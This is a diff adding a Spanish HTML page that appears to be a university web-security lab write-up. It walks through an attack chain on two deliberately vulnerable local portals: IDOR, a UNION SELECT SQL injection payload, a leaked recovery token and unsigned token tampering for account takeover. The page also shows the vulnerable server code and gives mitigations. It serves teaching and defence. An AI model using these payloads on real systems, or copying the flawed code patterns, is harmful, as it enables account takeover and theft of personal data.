@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fort Knox — Cadena de Ataque</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" />
+  <style>
+    :root {
+      --fk-dark:   #0d1b2a;
+      --fk-blue:   #1b4f8a;
+      --fk-accent: #f0a500;
+    }
+
+    body {
+      background: #f4f6f9;
+      font-family: 'Segoe UI', sans-serif;
+      color: #1e293b;
+    }
+
+    /* ── Hero ───────────────────────────────────────── */
+    .hero {
+      background: linear-gradient(135deg, var(--fk-dark), var(--fk-blue));
+      color: #fff;
+      padding: 3.5rem 0 3rem;
+    }
+    .hero h1 { font-size: 2rem; font-weight: 800; letter-spacing: 1px; }
+    .hero .subtitle { color: #94a3b8; font-size: .95rem; }
+    .hero .accent { color: var(--fk-accent); }
+
+    /* ── Timeline ───────────────────────────────────── */
+    .timeline { position: relative; padding-left: 3rem; }
+    .timeline::before {
+      content: '';
+      position: absolute;
+      left: 1.1rem;
+      top: 0; bottom: 0;
+      width: 2px;
+      background: linear-gradient(to bottom, var(--fk-blue), var(--fk-accent));
+    }
+
+    .step {
+      position: relative;
+      margin-bottom: 2.5rem;
+    }
+    .step-dot {
+      position: absolute;
+      left: -2.35rem;
+      top: .2rem;
+      width: 2.2rem; height: 2.2rem;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 700; font-size: .85rem;
+      border: 3px solid #fff;
+      box-shadow: 0 0 0 2px var(--fk-blue);
+    }
+    .dot-blue   { background: var(--fk-blue);   color: #fff; }
+    .dot-accent { background: var(--fk-accent); color: #0d1b2a; box-shadow: 0 0 0 2px var(--fk-accent); }
+    .dot-red    { background: #dc2626;           color: #fff; box-shadow: 0 0 0 2px #dc2626; }
+    .dot-green  { background: #16a34a;           color: #fff; box-shadow: 0 0 0 2px #16a34a; }
+
+    .step-card {
+      border: none;
+      border-radius: .6rem;
+      box-shadow: 0 2px 12px rgba(0,0,0,.08);
+      overflow: hidden;
+    }
+    .step-header {
+      padding: .9rem 1.2rem;
+      display: flex; align-items: center; gap: .75rem;
+    }
+    .step-header .vuln-tag {
+      font-size: .7rem; font-weight: 700; letter-spacing: .5px;
+      padding: .2em .7em; border-radius: 2rem;
+    }
+    .step-body { padding: 1.2rem; }
+
+    /* ── Code blocks ────────────────────────────────── */
+    .code-block {
+      background: #1e293b;
+      border-radius: .4rem;
+      padding: .9rem 1rem;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: .82rem;
+      color: #e2e8f0;
+      overflow-x: auto;
+      margin: .75rem 0;
+    }
+    .code-block .url    { color: #7dd3fc; }
+    .code-block .param  { color: #fbbf24; }
+    .code-block .inject { color: #f87171; }
+    .code-block .value  { color: #4ade80; }
+    .code-block .comment{ color: #64748b; }
+    .code-block .label  { color: #94a3b8; font-size: .75rem; }
+
+    /* ── Result box ─────────────────────────────────── */
+    .result-box {
+      background: #f0fdf4;
+      border: 1px solid #86efac;
+      border-radius: .4rem;
+      padding: .75rem 1rem;
+      font-size: .88rem;
+    }
+    .result-box .field { color: #6b7280; font-size: .78rem; font-weight: 600; text-transform: uppercase; }
+    .result-box .val   { color: #15803d; font-weight: 600; }
+
+    /* ── Why box ────────────────────────────────────── */
+    .why-box {
+      background: #fffbeb;
+      border-left: 3px solid var(--fk-accent);
+      padding: .75rem 1rem;
+      border-radius: 0 .4rem .4rem 0;
+      font-size: .88rem;
+      color: #78350f;
+      margin-top: .75rem;
+    }
+    .why-box strong { color: #92400e; }
+
+    /* ── Flow diagram ───────────────────────────────── */
+    .flow {
+      display: flex; flex-wrap: wrap;
+      align-items: center; gap: .5rem;
+      margin: .75rem 0;
+      font-size: .85rem;
+    }
+    .flow-box {
+      background: #fff;
+      border: 1.5px solid #e2e8f0;
+      border-radius: .4rem;
+      padding: .4rem .8rem;
+      white-space: nowrap;
+    }
+    .flow-arrow { color: #94a3b8; font-size: 1rem; }
+    .flow-box.highlight { background: var(--fk-blue); color: #fff; border-color: var(--fk-blue); }
+    .flow-box.danger    { background: #fee2e2; border-color: #f87171; color: #991b1b; }
+    .flow-box.success   { background: #dcfce7; border-color: #4ade80; color: #166534; }
+
+    /* ── Portals badge ──────────────────────────────── */
+    .portal-badge {
+      display: inline-flex; align-items: center; gap: .35rem;
+      font-size: .75rem; font-weight: 700; padding: .25em .65em;
+      border-radius: 2rem; white-space: nowrap;
+    }
+    .portal-clientes  { background: #ede9fe; color: #5b21b6; }
+    .portal-tracking  { background: #dbeafe; color: #1e40af; }
+
+    /* ── Summary table ──────────────────────────────── */
+    .summary-table th { background: var(--fk-dark); color: #fff; font-size: .8rem; font-weight: 600; }
+    .summary-table td { font-size: .88rem; vertical-align: middle; }
+
+    footer {
+      background: var(--fk-dark);
+      color: #4b5563;
+      font-size: .8rem;
+      padding: 1.5rem 0;
+      text-align: center;
+      margin-top: 4rem;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Hero -->
+<div class="hero">
+  <div class="container">
+    <div class="d-flex align-items-start gap-3">
+      <i class="bi bi-shield-exclamation" style="font-size: 2.8rem; opacity: .85; margin-top: .2rem;"></i>
+      <div>
+        <div style="font-size: .75rem; letter-spacing: 2px; color: #64748b; margin-bottom: .3rem;">
+          UTN FRBA · K5061 · GRUPO 4 · 2026
+        </div>
+        <h1 class="mb-1"><span class="accent">FORT KNOX</span> — Cadena de Ataque</h1>
+        <p class="subtitle mb-0">
+          Laboratorio de seguridad web sobre dos portales vulnerables de una joyería ficticia.
+        </p>
+        <div class="d-flex flex-wrap gap-2 mt-3">
+          <span class="portal-badge portal-clientes"><i class="bi bi-person-circle"></i> Portal de Clientes · :5000</span>
+          <span class="portal-badge portal-tracking"><i class="bi bi-truck"></i> Portal de Seguimiento · :5001</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Intro -->
+<div class="container py-4" style="max-width: 860px;">
+
+  <div class="alert d-flex gap-3 align-items-start mb-4"
+       style="background:#fff; border: 1px solid #e2e8f0; border-radius: .5rem; box-shadow: 0 1px 6px rgba(0,0,0,.05);">
+    <i class="bi bi-diagram-3-fill fs-4 mt-1" style="color: var(--fk-blue); flex-shrink:0;"></i>
+    <div>
+      <strong>Escenario</strong><br />
+      <span style="font-size:.9rem;">
+        El atacante es un cliente real de Fort Knox Joyas con una cuenta legítima.
+        A partir de su propio envío, encadena cuatro vulnerabilidades para tomar el control
+        de la cuenta de otro cliente (<strong>carlos_gomez</strong>) sin conocer su contraseña.
+      </span>
+    </div>
+  </div>
+
+  <!-- ═══════════════ TIMELINE ═══════════════ -->
+  <div class="timeline">
+
+    <!-- ── PASO 0: Login ─────────────────────────── -->
+    <div class="step">
+      <div class="step-dot dot-blue">0</div>
+      <div class="step-card card">
+        <div class="step-header" style="background: #f8fafc;">
+          <i class="bi bi-box-arrow-in-right" style="color: var(--fk-blue);"></i>
+          <span class="fw-semibold">Setup — El atacante se loguea en su cuenta legítima</span>
+          <span class="portal-badge portal-clientes ms-auto"><i class="bi bi-person-circle"></i> Clientes :5000</span>
+        </div>
+        <div class="step-body">
+          <p style="font-size:.9rem;" class="mb-2">
+            El atacante tiene una cuenta real. Al loguearse en el portal de clientes
+            se crea la cookie de sesión <code>fk_session</code>.
+          </p>
+
+          <div class="flow">
+            <div class="flow-box">POST /login<br/><small>attacker / FK2026!</small></div>
+            <span class="flow-arrow">→</span>
+            <div class="flow-box success">Set-Cookie: fk_session=...</div>
+          </div>
+
+          <div class="code-block">
+            <span class="label">REQUEST</span><br/>
+            POST <span class="url">http://localhost:5000/login</span><br/>
+            <span class="param">username</span>=<span class="value">attacker</span>
+            &amp;<span class="param">password</span>=<span class="value">FK2026!</span>
+          </div>
+
+          <div class="why-box">
+            <strong>Clave SSO:</strong> ambos portales comparten
+            <code>secret_key = 'fortknox-sso-shared-secret-2026'</code> y el nombre de cookie
+            <code>fk_session</code>. Los navegadores envían la cookie a <code>localhost</code>
+            sin distinguir por puerto, por lo que esta sesión también es válida en el
+            portal de seguimiento (:5001).
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PASO 1: IDOR ──────────────────────────── -->
+    <div class="step">
+      <div class="step-dot dot-blue">1</div>
+      <div class="step-card card">
+        <div class="step-header" style="background: #eff6ff;">
+          <i class="bi bi-eye" style="color: #1d4ed8;"></i>
+          <span class="fw-semibold">IDOR — Ver el envío de la víctima</span>
+          <span class="vuln-tag ms-1" style="background:#dbeafe;color:#1d4ed8;">A01 · BOLA</span>
+          <span class="portal-badge portal-tracking ms-auto"><i class="bi bi-truck"></i> Tracking :5001</span>
+        </div>
+        <div class="step-body">
+          <p style="font-size:.9rem;" class="mb-2">
+            El atacante recibió el link de su propio envío por email
+            (<code>shipment_id=48291</code>). Cambia el ID en la URL y accede al
+            envío de Carlos Gómez sin ninguna verificación de pertenencia.
+          </p>
+
+          <div class="flow">
+            <div class="flow-box">Mi envío: <code>48291</code></div>
+            <span class="flow-arrow">→</span>
+            <div class="flow-box highlight">Cambio ID en la URL</div>
+            <span class="flow-arrow">→</span>
+            <div class="flow-box danger">Envío ajeno: <code>19384</code></div>
+          </div>
+
+          <div class="code-block">
+            <span class="label">REQUEST</span><br/>
+            GET <span class="url">http://localhost:5001/tracking?</span><span class="param">shipment_id</span>=<span class="inject">19384</span>
+            <br/><br/>
+            <span class="comment">// El servidor no verifica que shipment_id pertenezca al usuario autenticado</span>
+          </div>
+
+          <div class="result-box">
+            <div class="row g-2">
+              <div class="col-6"><span class="field">Nombre</span><br/><span class="val">Carlos Gomez</span></div>
+              <div class="col-6"><span class="field">Email</span><br/><span class="val">carlos.gomez@gmail.com</span></div>
+              <div class="col-6"><span class="field">user_id</span><br/><span class="val">1</span></div>
+              <div class="col-6"><span class="field">Orden</span><br/><span class="val">ORD-2026-1001</span></div>
+            </div>
+          </div>
+
+          <div class="why-box mt-2">
+            <strong>Raíz del problema:</strong> el endpoint valida que haya cookie SSO
+            pero no compara el <code>user_id</code> del envío con el de la sesión activa.
+            Cualquier ID es consultable por fuerza bruta.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PASO 2: SQLi ──────────────────────────── -->
+    <div class="step">
+      <div class="step-dot dot-blue">2</div>
+      <div class="step-card card">
+        <div class="step-header" style="background: #eff6ff;">
+          <i class="bi bi-database-exclamation" style="color: #1d4ed8;"></i>
+          <span class="fw-semibold">SQL Injection — Extraer el username</span>
+          <span class="vuln-tag ms-1" style="background:#dbeafe;color:#1d4ed8;">A05 · SQLi</span>
+          <span class="portal-badge portal-tracking ms-auto"><i class="bi bi-truck"></i> Tracking :5001</span>
+        </div>
+        <div class="step-body">
+          <p style="font-size:.9rem;" class="mb-2">
+            El formulario de búsqueda por email concatena el parámetro directamente en la query SQL.
+            El atacante inyecta un <code>UNION SELECT</code> para extraer el username de la víctima.
+          </p>
+
+          <div class="code-block">
+            <span class="label">BÚSQUEDA NORMAL</span><br/>
+            GET <span class="url">http://localhost:5001/?</span><span class="param">email</span>=<span class="value">carlos.gomez@gmail.com</span>
+            <br/><br/>
+            <span class="comment">→ devuelve: ORD-2026-1001, En camino (sin username)</span>
+          </div>
+
+          <div class="code-block">
+            <span class="label">PAYLOAD INYECTADO</span><br/>
+            GET <span class="url">http://localhost:5001/?</span><span class="param">email</span>=<span class="inject">' UNION SELECT id, username, first_name, last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--</span>
+          </div>
+
+          <div class="code-block">
+            <span class="label">QUERY RESULTANTE EN EL SERVIDOR</span><br/>
+            SELECT s.shipment_id, s.order_number, s.status, ...<br/>
+            FROM shipments s JOIN users u ON s.user_id = u.id<br/>
+            WHERE u.email = <span class="inject">'' UNION SELECT id, username, first_name,<br/>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--</span>
+          </div>
+
+          <div class="result-box">
+            <span class="field">Username extraído</span><br/>
+            <span class="val" style="font-size:1.05rem;">carlos_gomez</span>
+          </div>
+
+          <div class="why-box mt-2">
+            <strong>Raíz del problema:</strong> el backend construye la query con f-string:
+            <code>f"WHERE u.email = '{email}'"</code> sin usar consultas parametrizadas.
+            No hay contraseñas en la tabla, pero el username es suficiente para el paso siguiente.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PASO 3: A02 ───────────────────────────── -->
+    <div class="step">
+      <div class="step-dot dot-accent">3</div>
+      <div class="step-card card">
+        <div class="step-header" style="background: #fffbeb;">
+          <i class="bi bi-bug" style="color: #d97706;"></i>
+          <span class="fw-semibold">Security Misconfiguration — Token expuesto en la respuesta</span>
+          <span class="vuln-tag ms-1" style="background:#fef3c7;color:#92400e;">A02 · Misconfig</span>
+          <span class="portal-badge portal-clientes ms-auto"><i class="bi bi-person-circle"></i> Clientes :5000</span>
+        </div>
+        <div class="step-body">
+          <p style="font-size:.9rem;" class="mb-2">
+            El endpoint de recuperación de cuenta devuelve el token directamente en la respuesta HTML
+            dentro de un bloque de debug que nunca fue removido antes del deploy.
+          </p>
+
+          <div class="code-block">
+            <span class="label">REQUEST</span><br/>
+            POST <span class="url">http://localhost:5000/account/recover</span><br/>
+            <span class="param">username</span>=<span class="value">carlos_gomez</span>
+          </div>
+
+          <div class="code-block">
+            <span class="label">FRAGMENTO DEL HTML DE RESPUESTA</span><br/>
+            &lt;div style="background: #1e293b;"&gt;<br/>
+            &nbsp;&nbsp;<span class="comment">[DEBUG] recovery_token:</span><br/>
+            &nbsp;&nbsp;<span class="value">eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3Jp...</span><br/>
+            &nbsp;&nbsp;<span class="comment">&lt;!-- TODO: remove before production deploy --&gt;</span><br/>
+            &lt;/div&gt;
+          </div>
+
+          <div class="code-block">
+            <span class="label">TOKEN DECODIFICADO (base64url → JSON)</span><br/>
+            {<br/>
+            &nbsp;&nbsp;<span class="param">"user"</span>: <span class="value">"carlos_gomez"</span>,<br/>
+            &nbsp;&nbsp;<span class="param">"authorized_email"</span>: <span class="value">"carlos.gomez@gmail.com"</span>,<br/>
+            &nbsp;&nbsp;<span class="param">"exp"</span>: <span class="value">"2026-05-19T01:00:00Z"</span><br/>
+            }
+          </div>
+
+          <div class="why-box">
+            <strong>Raíz del problema:</strong> el desarrollador dejó un bloque de debug
+            en el código de producción. El token debería enviarse únicamente al email
+            registrado del dueño de la cuenta, nunca retornarse en la respuesta HTTP.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── PASO 4: A08 ───────────────────────────── -->
+    <div class="step">
+      <div class="step-dot dot-red">4</div>
+      <div class="step-card card">
+        <div class="step-header" style="background: #fef2f2;">
+          <i class="bi bi-pencil-square" style="color: #dc2626;"></i>
+          <span class="fw-semibold">Token Tampering — Tomar el control de la cuenta</span>
+          <span class="vuln-tag ms-1" style="background:#fee2e2;color:#991b1b;">A08 · Deserialización</span>
+          <span class="portal-badge portal-clientes ms-auto"><i class="bi bi-person-circle"></i> Clientes :5000</span>
+        </div>
+        <div class="step-body">
+          <p style="font-size:.9rem;" class="mb-2">
+            El token es JSON codificado en base64url <strong>sin ninguna firma ni HMAC</strong>.
+            El atacante lo modifica para poner su propio email como <code>authorized_email</code>
+            y el servidor lo acepta sin verificar integridad.
+          </p>
+
+          <div class="code-block">
+            <span class="label">1 — DECODIFICAR</span><br/>
+            base64url.decode(token)<br/>
+            → { <span class="param">"user"</span>: <span class="value">"carlos_gomez"</span>,
+            <span class="param">"authorized_email"</span>: <span class="value">"carlos.gomez@gmail.com"</span> }
+          </div>
+
+          <div class="code-block">
+            <span class="label">2 — MODIFICAR authorized_email</span><br/>
+            { <span class="param">"user"</span>: <span class="value">"carlos_gomez"</span>,
+            <span class="param">"authorized_email"</span>: <span class="inject">"attacker@mailinator.com"</span> }
+          </div>
+
+          <div class="code-block">
+            <span class="label">3 — RE-CODIFICAR Y ENVIAR</span><br/>
+            GET <span class="url">http://localhost:5000/account/confirm-recovery?</span><br/>
+            &nbsp;&nbsp;&nbsp;&nbsp;<span class="param">token</span>=<span class="inject">eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3JpemVkX2VtYWlsIjogImF0dGFja2VyQG1haWxpbmF0b3IuY29tIn0</span>
+          </div>
+
+          <div class="code-block">
+            <span class="label">CÓDIGO VULNERABLE EN EL SERVIDOR</span><br/>
+            <span class="comment"># A08: sin verificacion de firma</span><br/>
+            payload = json.loads(<span class="inject">base64.urlsafe_b64decode(token)</span>)<br/>
+            <span class="comment"># acepta cualquier JSON valido, firmado o no</span><br/>
+            conn.execute(<span class="value">'UPDATE users SET email = ?'</span>, (payload[<span class="value">'authorized_email'</span>],))
+          </div>
+
+          <div class="result-box" style="background:#fef2f2; border-color:#f87171;">
+            <div class="row g-2">
+              <div class="col-12">
+                <span class="field">Resultado</span><br/>
+                <span style="color:#dc2626; font-weight:700;">
+                  Sesión iniciada como carlos_gomez.<br/>
+                  Email de la cuenta actualizado a attacker@mailinator.com.<br/>
+                  Acceso total a la cuenta de la víctima.
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <div class="why-box">
+            <strong>Raíz del problema:</strong> el token no está firmado con ningún secreto (HMAC-SHA256,
+            JWT, etc.). El servidor confía ciegamente en el contenido decodificado. La corrección
+            sería firmar el token al generarlo y verificar la firma antes de procesarlo.
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /timeline -->
+
+  <!-- ═══════════════ RESUMEN ═══════════════ -->
+  <h5 class="fw-bold mt-2 mb-3" style="color: var(--fk-dark);">
+    <i class="bi bi-table"></i> Resumen de la cadena
+  </h5>
+
+  <div class="card mb-4">
+    <div class="table-responsive">
+      <table class="table align-middle mb-0 summary-table">
+        <thead>
+          <tr>
+            <th style="padding: .8rem 1rem;">Paso</th>
+            <th>Portal</th>
+            <th>Endpoint</th>
+            <th>Vulnerabilidad</th>
+            <th>Dato obtenido</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="ps-3 fw-semibold">0</td>
+            <td><span class="portal-badge portal-clientes">Clientes</span></td>
+            <td><code>POST /login</code></td>
+            <td>—</td>
+            <td>Cookie SSO <code>fk_session</code></td>
+          </tr>
+          <tr>
+            <td class="ps-3 fw-semibold">1</td>
+            <td><span class="portal-badge portal-tracking">Tracking</span></td>
+            <td><code>GET /tracking?shipment_id=19384</code></td>
+            <td><span class="vuln-tag" style="background:#dbeafe;color:#1d4ed8;">A01 IDOR</span></td>
+            <td>Nombre, email y user_id de la víctima</td>
+          </tr>
+          <tr>
+            <td class="ps-3 fw-semibold">2</td>
+            <td><span class="portal-badge portal-tracking">Tracking</span></td>
+            <td><code>GET /?email=' UNION SELECT…</code></td>
+            <td><span class="vuln-tag" style="background:#dbeafe;color:#1d4ed8;">A05 SQLi</span></td>
+            <td>Username: <code>carlos_gomez</code></td>
+          </tr>
+          <tr>
+            <td class="ps-3 fw-semibold">3</td>
+            <td><span class="portal-badge portal-clientes">Clientes</span></td>
+            <td><code>POST /account/recover</code></td>
+            <td><span class="vuln-tag" style="background:#fef3c7;color:#92400e;">A02 Misconfig</span></td>
+            <td>Token de recuperación en texto claro</td>
+          </tr>
+          <tr>
+            <td class="ps-3 fw-semibold">4</td>
+            <td><span class="portal-badge portal-clientes">Clientes</span></td>
+            <td><code>GET /account/confirm-recovery?token=…</code></td>
+            <td><span class="vuln-tag" style="background:#fee2e2;color:#991b1b;">A08 Tampering</span></td>
+            <td>Acceso total a la cuenta de carlos_gomez</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- ═══════════════ MITIGACIONES ═══════════════ -->
+  <h5 class="fw-bold mb-3" style="color: var(--fk-dark);">
+    <i class="bi bi-shield-check"></i> Mitigaciones
+  </h5>
+  <div class="row g-3 mb-4">
+    <div class="col-md-6">
+      <div class="card h-100 p-3">
+        <div class="d-flex gap-2 align-items-start">
+          <i class="bi bi-1-circle-fill fs-5 mt-1" style="color: var(--fk-blue); flex-shrink:0;"></i>
+          <div>
+            <div class="fw-semibold" style="font-size:.9rem;">A01 — Verificar ownership</div>
+            <div class="text-muted" style="font-size:.83rem;">
+              Comparar el <code>user_id</code> del recurso con el <code>user_id</code>
+              de la sesión antes de devolver el resultado.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="card h-100 p-3">
+        <div class="d-flex gap-2 align-items-start">
+          <i class="bi bi-2-circle-fill fs-5 mt-1" style="color: var(--fk-blue); flex-shrink:0;"></i>
+          <div>
+            <div class="fw-semibold" style="font-size:.9rem;">A05 — Consultas parametrizadas</div>
+            <div class="text-muted" style="font-size:.83rem;">
+              Usar <code>cursor.execute(query, (param,))</code> en lugar de
+              f-strings. Nunca concatenar input del usuario en SQL.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="card h-100 p-3">
+        <div class="d-flex gap-2 align-items-start">
+          <i class="bi bi-3-circle-fill fs-5 mt-1" style="color: var(--fk-blue); flex-shrink:0;"></i>
+          <div>
+            <div class="fw-semibold" style="font-size:.9rem;">A02 — Remover debug en producción</div>
+            <div class="text-muted" style="font-size:.83rem;">
+              El token de recuperación debe enviarse únicamente por email al dueño
+              de la cuenta. Nunca retornarlo en la respuesta HTTP.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="col-md-6">
+      <div class="card h-100 p-3">
+        <div class="d-flex gap-2 align-items-start">
+          <i class="bi bi-4-circle-fill fs-5 mt-1" style="color: var(--fk-blue); flex-shrink:0;"></i>
+          <div>
+            <div class="fw-semibold" style="font-size:.9rem;">A08 — Firmar el token (HMAC)</div>
+            <div class="text-muted" style="font-size:.83rem;">
+              Usar <code>hmac.new(secret, payload, sha256)</code> o JWT firmado.
+              Verificar la firma antes de procesar cualquier campo del token.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<footer>
+  &copy; 2026 Fort Knox Joyas S.A. &nbsp;&middot;&nbsp;
+  Seguridad en Aplicaciones Web K5061 &nbsp;&middot;&nbsp; UTN FRBA &nbsp;&middot;&nbsp; Grupo 4
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
